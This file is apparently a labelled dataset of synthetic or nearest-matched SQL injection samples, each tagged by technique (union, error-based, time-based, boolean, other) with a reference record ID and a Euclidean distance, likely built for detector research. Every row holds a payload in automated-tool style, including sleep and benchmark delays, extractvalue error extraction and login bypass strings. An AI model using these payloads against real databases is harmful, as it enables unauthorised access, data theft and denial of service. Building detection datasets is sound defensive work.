CTGAN_000730,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R004681,3.7031413097684527
CTGAN_000731,attack,error,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R005561,6.120870984406806
CTGAN_000732,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,7.123781321093194
CTGAN_000733,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb",nearest_attack_euclidean,R001069,1.616506442971346
CTGAN_000734,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R005725,7.415985077569517
CTGAN_000735,attack,other,"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R004739,4.600783713651197
CTGAN_000736,attack,boolean,-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',nearest_attack_euclidean,R007629,2.996732424071776
CTGAN_000737,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R002457,3.887428025100692
CTGAN_000738,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",nearest_attack_euclidean,R008550,2.6338254326277744
CTGAN_000739,attack,other,1'  )   where 1115  =  1115,nearest_attack_euclidean,R006621,3.636750430856929
CTGAN_000740,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R001089,2.723584995728937
CTGAN_000741,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000156,10.488355760132915
CTGAN_000742,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000986,3.626221448733641
CTGAN_000743,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R002180,2.2744559011723866
CTGAN_000744,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,0.9520096966649408
CTGAN_000745,attack,time,1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R005518,3.4322057462951348
CTGAN_000746,attack,other,1 where 1092  =  1092,nearest_attack_euclidean,R003952,1.9771377140965392
CTGAN_000747,attack,other,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",nearest_attack_euclidean,R007990,4.495792540588496
CTGAN_000748,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R002542,4.059799359641828
CTGAN_000749,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R002009,4.863266268285819
CTGAN_000750,attack,boolean,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R005235,4.280278215193672
CTGAN_000751,attack,boolean,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R001869,3.0826190916685747
CTGAN_000752,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R005998,5.48085889829773
CTGAN_000753,attack,boolean,"1'  )   where 1646  =  1646 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003538,2.746157484342121
CTGAN_000754,attack,other,"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R002011,6.198908235600379
CTGAN_000755,attack,time,"1""  )   where 9086  =  9086 or sleep  (  5  )  #",nearest_attack_euclidean,R008062,5.049730841665871
CTGAN_000756,attack,other,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",nearest_attack_euclidean,R007990,6.200808746211882
CTGAN_000757,attack,union,"1%""  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R004495,3.2393736010251644
CTGAN_000758,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R004683,2.689706876760666
CTGAN_000759,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R006221,5.908700161980129
CTGAN_000760,attack,other,select name from syscolumns where id   =     (  sele ...,nearest_attack_euclidean,R000440,1.8442562848738284
CTGAN_000761,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R005112,2.925667967787518
CTGAN_000762,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R004690,12.408146430892426
CTGAN_000763,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R008013,3.7557106182209505
CTGAN_000764,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000665,4.183041598700259
CTGAN_000765,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003725,4.597555214440569
CTGAN_000766,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,2.2612309718515604
CTGAN_000767,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R007873,3.5482570088129664
CTGAN_000768,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R006291,4.286784290061288
CTGAN_000769,attack,boolean,"1%"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R008709,3.772521585697317
CTGAN_000770,attack,boolean,"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007242,4.808145544710207
CTGAN_000771,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000989,4.819893203314358
CTGAN_000772,attack,boolean,"1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R004454,2.2134058424709306
CTGAN_000773,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R003861,3.036210402664072
CTGAN_000774,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,5.34286308417671
CTGAN_000775,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,2.7240861946946606
CTGAN_000776,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,4.839392519719874
CTGAN_000777,attack,boolean,"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R008881,6.434032722096107
CTGAN_000778,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R005492,3.984638758624224
CTGAN_000779,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R003637,5.474461159107327
CTGAN_000780,attack,boolean,"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",nearest_attack_euclidean,R002559,2.3305213641280855
CTGAN_000781,attack,time,"1%""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R006787,5.173974262449152
CTGAN_000782,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003806,1.7691011637916347
CTGAN_000783,attack,union,"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",nearest_attack_euclidean,R008139,3.309392211939326
CTGAN_000784,attack,time,1'  )   and sleep  (  5  ) ,nearest_attack_euclidean,R007055,3.483838619414007
CTGAN_000785,attack,boolean,"1""  )   where 6956  =  6956 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002469,0.9918582916408187
CTGAN_000786,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",nearest_attack_euclidean,R004455,5.021376420364311
CTGAN_000787,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,3.1851308257858415
CTGAN_000788,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",nearest_attack_euclidean,R001092,4.034663535160457
CTGAN_000789,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R003715,2.4953843767753896
CTGAN_000790,attack,boolean,"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R007628,3.1804395301637243
CTGAN_000791,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R007826,3.5770007924290113
CTGAN_000792,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R002441,3.5487078401315064
CTGAN_000793,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R002951,3.2068618733687138
CTGAN_000794,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf",nearest_attack_euclidean,R001508,3.763403462444891
CTGAN_000795,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,8.286680983749827
CTGAN_000796,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,3.7513854698686533
CTGAN_000797,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R007900,3.482721938528174
CTGAN_000798,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,5.189140575167386
CTGAN_000799,attack,boolean,"-2625'  )   or elt  (  1032  =  1032,3623  )   and   (  'eliy'  =  'eliy",nearest_attack_euclidean,R004369,2.6318373721897075
CTGAN_000800,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R008055,2.6343142944043314
CTGAN_000801,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R005810,3.220148235728121
CTGAN_000802,attack,boolean,"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ztzu",nearest_attack_euclidean,R008930,2.6828467758055186
CTGAN_000803,attack,boolean,"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005271,2.4566335891636735
CTGAN_000804,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R005725,4.017327410834327
CTGAN_000805,attack,error,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R001683,8.206962971714097
CTGAN_000806,attack,other,"1""  )   where 8588  =  8588",nearest_attack_euclidean,R007950,1.1722409330534764
CTGAN_000807,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R008318,3.53376994237674
CTGAN_000808,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008983,4.003272183079234
CTGAN_000809,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000943,5.1216678805850675
CTGAN_000810,attack,boolean,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000780,3.703636002502447
CTGAN_000811,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R004049,2.9105739606224548
CTGAN_000812,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R003740,4.268696623144132
CTGAN_000813,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R003229,3.7833757685018603
CTGAN_000814,attack,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",nearest_attack_euclidean,R000019,4.728995509944027
CTGAN_000815,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,7.1126014199464676
CTGAN_000816,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003165,3.8537185509829395
CTGAN_000817,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R005308,4.876098031689482
CTGAN_000818,attack,other,"1""   )    )    as irrz where 8730  =  8730 order by 1#",nearest_attack_euclidean,R004807,4.0675428430265725
CTGAN_000819,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,3.5133337061746603
CTGAN_000820,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,2.4374122047301228
CTGAN_000821,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,2.310663582008191
CTGAN_000822,attack,other,"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R008384,4.569978001389012
CTGAN_000823,attack,boolean," end and    (    (   ""cxoi""  =  ""cxoi",nearest_attack_euclidean,R008060,1.7155820889899858
CTGAN_000824,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R008345,4.709433643216307
CTGAN_000825,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",nearest_attack_euclidean,R005523,1.2434740997699456
CTGAN_000826,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",nearest_attack_euclidean,R005219,2.2520197837560145
CTGAN_000827,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000694,3.613893917937837
CTGAN_000828,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,2.4223110184054484
CTGAN_000829,attack,error,"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",nearest_attack_euclidean,R007137,6.034763221972723
CTGAN_000830,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001870,2.2377837145603334
CTGAN_000831,attack,other, (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R008479,5.163239090427462
CTGAN_000832,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R006250,5.685984150459449
CTGAN_000833,attack,time,1  )   and sleep  (  5  )  #,nearest_attack_euclidean,R004594,3.3003517926812607
CTGAN_000834,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R005578,3.0836995363643824
CTGAN_000835,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R006731,5.575530432957238
CTGAN_000836,attack,other,"-7416"" where 7656  =  7656 order by 1--",nearest_attack_euclidean,R001091,3.7971807559160418
CTGAN_000837,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz",nearest_attack_euclidean,R008037,3.09922676170648
CTGAN_000838,attack,error,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'dgwe' like 'dgwe",nearest_attack_euclidean,R008107,3.673998010408543
CTGAN_000839,attack,other,having 1  =  1--,nearest_attack_euclidean,R000491,4.24496077526854
CTGAN_000840,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'cogk'  =  'cogk",nearest_attack_euclidean,R005934,4.900012182324973
CTGAN_000841,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,3.380894095577787
CTGAN_000842,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lqwz'  =  'lqwz",nearest_attack_euclidean,R005347,3.8411188815604973
CTGAN_000843,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R004932,2.1599551542538125
CTGAN_000844,attack,error,"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R002819,2.758043953710902
CTGAN_000845,attack,error,-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R004259,4.541145699883074
CTGAN_000846,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R005177,5.4129099204583975
CTGAN_000847,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R001168,4.676928232678943
CTGAN_000848,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R006144,4.819801375829003
CTGAN_000849,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R002568,2.4841342577314687
CTGAN_000850,attack,boolean,"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,nearest_attack_euclidean,R002298,3.843719024534708
CTGAN_000851,attack,error,1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,nearest_attack_euclidean,R004081,4.133524252558241
CTGAN_000852,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",nearest_attack_euclidean,R006609,4.075126337174084
CTGAN_000853,attack,error,"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R003102,4.955951591799525
CTGAN_000854,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R002515,2.769500566153966
CTGAN_000855,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R003389,3.3420574574593207
CTGAN_000856,attack,error,-6179   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   7732  =  7732,nearest_attack_euclidean,R005046,3.0559265686011687
CTGAN_000857,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R002951,3.4624237619355935
CTGAN_000858,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R005308,5.99303601665938
CTGAN_000859,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000108,34.74546073727097
CTGAN_000860,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",nearest_attack_euclidean,R006376,4.792200472786908
CTGAN_000861,attack,time,1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R005518,4.786066317973609
CTGAN_000862,attack,other,"1""  )   where 1300  =  1300 order by 1#",nearest_attack_euclidean,R004898,3.8172277207301364
CTGAN_000863,attack,union,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R008523,2.840863843540546
CTGAN_000864,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R002459,2.7052663548524305
CTGAN_000865,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R005823,3.0703741111628333
CTGAN_000866,attack,boolean,"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",nearest_attack_euclidean,R003208,2.2902304513437914
CTGAN_000867,attack,error,"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R002195,4.2645454660819
CTGAN_000868,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001870,3.0362134294523404
CTGAN_000869,attack,other, (  select   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  select 6714 from master..sysdatabases  )   end   )    ) ,nearest_attack_euclidean,R007461,4.929672873353452
CTGAN_000870,attack,boolean,"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R007038,4.410086063199919
CTGAN_000871,attack,other,if  (  8574  =  7534  )   select 8574 else drop function nxbe--,nearest_attack_euclidean,R003662,2.0048111917589826
CTGAN_000872,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",nearest_attack_euclidean,R007826,6.58384603302664
CTGAN_000873,attack,error,"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",nearest_attack_euclidean,R003905,4.45235449338732
CTGAN_000874,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,2.3429578108898905
